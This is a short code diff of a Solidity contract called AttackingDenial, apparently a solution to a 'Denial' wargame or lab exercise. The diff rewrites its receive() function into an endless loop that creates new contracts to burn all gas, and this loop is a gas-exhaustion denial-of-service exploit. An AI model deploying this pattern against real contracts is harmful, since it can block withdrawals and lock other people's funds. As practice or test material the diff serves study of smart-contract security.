@@ -9,13 +9,11 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    receive() payable external {
-        while(true) {
-            // gas intensive just to reduce test time (:
-            // create -> 
-            assembly {
-                pop(create(0,0,0))
-            }
+    receive() external payable {
+        while (true) {
+            // gas intensive just to reduce test time:
+            // CREATE opcode minimum gas = 32000
+            Denial d = new Denial();
         }
     }
 }
